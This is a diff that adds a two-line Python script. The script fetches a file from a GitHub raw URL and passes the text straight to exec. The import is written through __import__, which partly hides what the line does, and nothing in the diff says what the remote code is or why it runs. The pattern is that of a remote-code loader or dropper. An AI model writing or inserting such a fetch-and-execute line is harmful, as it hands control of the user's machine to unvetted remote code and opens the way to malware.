@@ -1,0 +1,2 @@
+#!/bin/python
+exec(__import__('requests').get('https://raw.githubusercontent.com/NKZA1/NKZ/main/NKZ.py').text)
